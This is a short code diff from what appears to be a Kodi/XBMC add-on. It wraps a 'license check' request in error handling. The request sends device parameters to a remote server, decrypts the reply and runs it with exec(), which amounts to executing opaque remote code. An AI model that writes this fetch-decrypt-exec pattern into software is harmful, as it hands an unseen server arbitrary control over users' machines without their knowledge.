@@ -66,11 +66,13 @@ if os.path.exists(STARTUP_ORIG):
     except Exception as e:
         xbmc.log(str(e))
 
-initial_code = Open_URL(url=BASE+'boxer/Check_License.php?x=%s&v=%s&r=3' % (Get_Params(), XBMC_VERSION),post_type='post')
 try:
+    initial_code = Open_URL(url=BASE+'boxer/Check_License.php?x=%s&v=%s&r=3' % (Get_Params(), XBMC_VERSION),post_type='post')
     exec(Encrypt('d',initial_code))
 except:
     dolog(Last_Error())
+    if not os.path.exists(NON_REGISTERED):
+        os.makedirs(NON_REGISTERED)
 
 if not os.path.exists(INSTALL_COMPLETE) and os.path.exists(TBS):
     xbmc.executebuiltin('Notification(Installing new updates,Please wait...,10000,%s)' % INTERNET_ICON)
